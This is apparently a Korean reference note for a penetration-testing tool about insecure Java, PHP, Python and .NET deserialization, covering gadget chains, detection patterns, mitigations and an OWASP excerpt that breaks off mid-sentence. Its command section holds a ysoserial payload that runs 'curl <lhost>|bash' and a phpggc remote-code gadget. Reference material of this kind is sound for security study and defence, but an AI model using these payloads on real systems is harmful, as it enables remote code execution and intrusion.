# 학습 시드(심화): deserialization

> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn deserialization`. P1: 머신별 라이트업 미참조.

## 개요
안전하지 않은 역직렬화: 신뢰불가 직렬화 데이터 복원 시 가젯체인으로 RCE. CWE-502.

## 핵심 기법 · 열거
- Java: ysoserial 가젯(CommonsCollections 등)
- PHP: __wakeup/__destruct 매직메서드 체인(POP)
- Python pickle·.NET ViewState·Ruby Marshal
- 탐지: 매직바이트(rO0=Java, O:PHP)

## 표준 도구 · 명령
```
java -jar ysoserial.jar CommonsCollections5 'curl <lhost>|bash' | base64
phpggc Monolog/RCE1 system id          # PHP 가젯
# 쿠키/파라미터의 base64 역직렬화 지점 교체
```

## 블루팀 탐지
rO0AB/O:숫자 패턴 입력·역직렬화 후 비정상 자식프로세스·가젯 클래스 로드.

## 완화
신뢰불가 역직렬화 금지·서명/무결성·허용목록 클래스·JSON 등 데이터 포맷.

- 출처(검증): https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html

## 최신 보강(승격)

> `assassin --promote` 품질 관문을 통과한 권위 출처 발췌. 수정·삭제는 PR 리뷰로. 사람이 다듬은 위 섹션이 우선한다.

### OWASP Deserialization
- 출처: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
- 승격일: 2026-10-07
- 요약: Deserialization Cheat Sheet¶ Introduction¶ This article is focused on providing clear, actionable guidance for safely deserializing untrusted data in your applications. What is Deserialization¶ Serialization is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them for storage, or to send as part of communications. Deserialization is the reverse of that process, taking data structured in some format, and rebuilding i
